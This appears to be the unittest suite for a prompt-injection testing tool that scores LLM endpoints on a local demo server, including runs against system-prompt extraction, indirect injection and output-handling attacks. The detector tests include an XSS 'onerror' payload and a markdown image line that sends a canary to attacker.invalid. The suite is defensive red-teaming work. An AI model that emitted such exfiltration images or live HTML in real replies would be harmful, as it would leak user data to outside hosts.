"""
Tests for SecurAI Prompt Tester. Standard library only.
Run with:  python -m unittest discover -s tests -v
"""
import json
import sys
import tempfile
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from prompt_tester import cli
from prompt_tester.demo_server import SYSTEM_MARKER, start_demo_server, stop_demo_server
from prompt_tester.detectors import (check_contains, check_exact, check_leak, check_md_image,
                                     check_raw_html)
from prompt_tester.payloads import BUILTIN_PAYLOADS, load_payloads, render_prompt, validate_payload
from prompt_tester.report import to_json, to_markdown
from prompt_tester.runner import TestResult, counts, rating, run_tests, score
from prompt_tester.target import (Target, TargetError, extract_text, fill_template, is_local_url,
                                  template_has_placeholder)

CANARY = "SAI-deadbeef"


class TestDetectors(unittest.TestCase):
    def test_exact_vulnerable_when_reply_is_only_canary(self):
        self.assertEqual(check_exact(CANARY, CANARY).status, "vulnerable")
        self.assertEqual(check_exact('  "SAI-DEADBEEF".  ', CANARY).status, "vulnerable")

    def test_exact_review_when_canary_in_longer_text(self):
        self.assertEqual(check_exact("I will not say SAI-deadbeef, sorry.", CANARY).status, "review")

    def test_exact_resisted_when_absent(self):
        self.assertEqual(check_exact("How can I help?", CANARY).status, "resisted")

    def test_contains(self):
        self.assertEqual(check_contains("SAI-deadbeef\nHere is the answer", CANARY).status, "vulnerable")
        self.assertEqual(check_contains("I can't print SAI-deadbeef", CANARY).status, "review")
        self.assertEqual(check_contains("Nothing here", CANARY).status, "resisted")

    def test_leak(self):
        self.assertEqual(check_leak("my rules: SECRET-POLICY-7 applies", ["secret-policy-7"]).status, "vulnerable")
        self.assertEqual(check_leak("no idea", ["SECRET-POLICY-7"]).status, "resisted")
        self.assertEqual(check_leak("anything", []).status, "skipped")

    def test_raw_html(self):
        live = "<img src=x onerror=alert('SAI-deadbeef')>"
        self.assertEqual(check_raw_html(live, CANARY).status, "vulnerable")
        self.assertEqual(check_raw_html("&lt;img src=x onerror=alert('SAI-deadbeef')&gt;", CANARY).status, "resisted")

    def test_md_image(self):
        md = "![status](https://attacker.invalid/collect?q=SAI-deadbeef)"
        self.assertEqual(check_md_image(md, CANARY).status, "vulnerable")
        self.assertEqual(check_md_image("```\n" + md + "\n```", CANARY).status, "review")
        self.assertEqual(check_md_image("I cannot do that", CANARY).status, "resisted")


class TestPayloads(unittest.TestCase):
    def test_all_builtin_payloads_are_valid_and_unique(self):
        ids = [p["id"] for p in BUILTIN_PAYLOADS]
        self.assertEqual(len(ids), len(set(ids)))
        for p in BUILTIN_PAYLOADS:
            validate_payload(p)

    def test_render_fills_canary_and_base64(self):
        p = next(x for x in BUILTIN_PAYLOADS if x["id"] == "PI-014")
        text = render_prompt(p, CANARY)
        self.assertNotIn("{b64}", text)
        self.assertNotIn(CANARY, text)  # hidden inside the base64, not visible
        q = next(x for x in BUILTIN_PAYLOADS if x["id"] == "PI-013")
        self.assertIn(CANARY, render_prompt(q, CANARY))  # braces in the JSON survive

    def test_filters(self):
        self.assertTrue(all(p["category"] == "encoding" for p in load_payloads(categories=["encoding"])))
        self.assertEqual([p["id"] for p in load_payloads(only=["PI-001"])], ["PI-001"])

    def test_custom_payload_file_is_validated(self):
        with tempfile.NamedTemporaryFile("w", suffix=".json", delete=False) as f:
            json.dump([{"id": "X-1", "category": "direct-override", "severity": "bogus",
                        "name": "n", "prompt": "p", "detector": "exact"}], f)
        with self.assertRaises(ValueError):
            load_payloads(f.name)


class TestTarget(unittest.TestCase):
    def test_template_substitution_keeps_json_valid(self):
        out = fill_template({"messages": [{"role": "user", "content": "{{prompt}}"}]}, 'He said "hi"\nnew line')
        self.assertEqual(out["messages"][0]["content"], 'He said "hi"\nnew line')

    def test_placeholder_detection(self):
        self.assertTrue(template_has_placeholder({"a": ["x", "{{prompt}}"]}))
        self.assertFalse(template_has_placeholder({"a": "x"}))

    def test_extract_text_paths(self):
        body = json.dumps({"choices": [{"message": {"content": "hi there"}}]})
        self.assertEqual(extract_text(body), "hi there")
        self.assertEqual(extract_text(body, "choices.0.message.content"), "hi there")
        self.assertEqual(extract_text(json.dumps({"content": [{"type": "text", "text": "yo"}]})), "yo")
        self.assertEqual(extract_text("plain text"), "plain text")
        with self.assertRaises(TargetError):
            extract_text(body, "nope.path")

    def test_target_validation(self):
        with self.assertRaises(TargetError):
            Target("http://x", body_template={"a": "no placeholder"})
        with self.assertRaises(TargetError):
            Target("http://x", method="GET")
        with self.assertRaises(TargetError):
            Target("http://x", method="PUT")

    def test_is_local_url(self):
        self.assertTrue(is_local_url("http://127.0.0.1:8000/x"))
        self.assertTrue(is_local_url("http://localhost/x"))
        self.assertFalse(is_local_url("https://example.com/x"))

    def test_connection_error_is_reported_not_raised(self):
        resp = Target("http://127.0.0.1:1/none", timeout=2).send("hi")
        self.assertIsNotNone(resp.error)
        self.assertIsNone(resp.text)


class TestScoring(unittest.TestCase):
    def _r(self, status, severity="high"):
        return TestResult(id="T", name="t", category="direct-override", severity=severity, status=status)

    def test_score_math(self):
        self.assertEqual(score([self._r("resisted"), self._r("resisted")]), 100)
        self.assertEqual(score([self._r("vulnerable"), self._r("vulnerable")]), 0)
        self.assertEqual(score([self._r("resisted"), self._r("review")]), 75)
        # weights: high=3 resisted, medium=2 vulnerable -> 3/5 = 60
        self.assertEqual(score([self._r("resisted", "high"), self._r("vulnerable", "medium")]), 60)

    def test_score_ignores_skipped_and_errors(self):
        self.assertEqual(score([self._r("resisted"), self._r("skipped"), self._r("error")]), 100)
        self.assertIsNone(score([self._r("error")]))

    def test_rating_labels(self):
        self.assertEqual(rating(95), "Strong")
        self.assertEqual(rating(75), "Moderate")
        self.assertEqual(rating(50), "Weak")
        self.assertEqual(rating(10), "Poor")
        self.assertEqual(rating(None), "Not tested")


class TestAgainstDemoApps(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.server, cls.port = start_demo_server(0)

    @classmethod
    def tearDownClass(cls):
        stop_demo_server(cls.server)

    def run_app(self, app, markers=(SYSTEM_MARKER,), repeat=1):
        target = Target(f"http://127.0.0.1:{self.port}/{app}")
        return run_tests(target, load_payloads(), repeat=repeat, markers=list(markers))

    def test_hardened_app_scores_100(self):
        results = self.run_app("hardened")
        self.assertEqual(score(results), 100)
        self.assertEqual(counts(results)["vulnerable"], 0)

    def test_vulnerable_app_scores_0(self):
        results = self.run_app("vulnerable")
        self.assertEqual(score(results), 0)
        self.assertEqual(counts(results)["resisted"], 0)

    def test_mixed_app_falls_only_for_its_weak_categories(self):
        results = self.run_app("mixed")
        bad = {r.category for r in results if r.status == "vulnerable"}
        self.assertEqual(bad, {"indirect-injection", "multilingual", "output-handling"})
        self.assertEqual(counts(results)["vulnerable"], 8)
        self.assertEqual(score(results), 62)

    def test_leak_tests_are_skipped_without_marker(self):
        results = self.run_app("vulnerable", markers=())
        leak = [r for r in results if r.category == "system-prompt-extraction"]
        self.assertTrue(leak and all(r.status == "skipped" for r in leak))

    def test_repeat_runs_are_counted(self):
        results = run_tests(Target(f"http://127.0.0.1:{self.port}/vulnerable"),
                            load_payloads(only=["PI-001"]), repeat=3)
        self.assertEqual(results[0].runs, 3)
        self.assertEqual(results[0].vulnerable_runs, 3)

    def test_unknown_endpoint_gives_errors_not_a_score(self):
        results = run_tests(Target(f"http://127.0.0.1:{self.port}/nope"), load_payloads(only=["PI-001"]))
        self.assertEqual(results[0].status, "error")
        self.assertIsNone(score(results))


class TestReports(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.server, cls.port = start_demo_server(0)
        target = Target(f"http://127.0.0.1:{cls.port}/mixed")
        cls.results = run_tests(target, load_payloads(), markers=[SYSTEM_MARKER])

    @classmethod
    def tearDownClass(cls):
        stop_demo_server(cls.server)

    def test_markdown_has_expected_sections(self):
        md = to_markdown("demo", self.results, client_name="Acme", consultant_name="Me")
        for heading in ("# Prompt Injection Resistance Report", "## Summary", "## Findings",
                        "## Results by attack type", "## Limits of this test"):
            self.assertIn(heading, md)
        self.assertIn("Prepared for: Acme", md)
        self.assertIn("62/100", md)

    def test_reports_contain_no_dash_characters_we_avoid(self):
        md = to_markdown("demo", self.results)
        js = to_json("demo", self.results)
        for bad in ("\u2014", "\u2013"):
            self.assertNotIn(bad, md)

    def test_json_report_roundtrips(self):
        data = json.loads(to_json("demo", self.results))
        self.assertEqual(data["score"], 62)
        self.assertEqual(len(data["results"]), 21)


class TestCli(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.server, cls.port = start_demo_server(0)

    @classmethod
    def tearDownClass(cls):
        stop_demo_server(cls.server)

    def scan(self, app, *extra):
        return cli.main(["scan", "--url", f"http://127.0.0.1:{self.port}/{app}", "--delay", "0",
                         "--quiet", "--out", str(Path(tempfile.mkdtemp()) / "r.md"), *extra])

    def test_exit_codes(self):
        self.assertEqual(self.scan("hardened", "--fail-under", "90"), 0)
        self.assertEqual(self.scan("vulnerable", "--fail-under", "90"), 1)
        self.assertEqual(self.scan("vulnerable"), 0)

    def test_non_local_url_requires_authorized_flag(self):
        code = cli.main(["scan", "--url", "https://example.com/api", "--quiet"])
        self.assertEqual(code, 2)

    def test_bad_header_and_bad_template_are_clean_errors(self):
        self.assertEqual(self.scan("hardened", "--header", "NoColonHere"), 2)
        self.assertEqual(self.scan("hardened", "--body-template", "{not json"), 2)
        self.assertEqual(self.scan("hardened", "--body-template", '{"a": "x"}'), 2)

    def test_unreachable_target_exits_3(self):
        code = cli.main(["scan", "--url", "http://127.0.0.1:1/x", "--timeout", "1", "--delay", "0",
                         "--quiet", "--only", "PI-001", "--out", str(Path(tempfile.mkdtemp()) / "r.md")])
        self.assertEqual(code, 3)


if __name__ == "__main__":
    unittest.main()
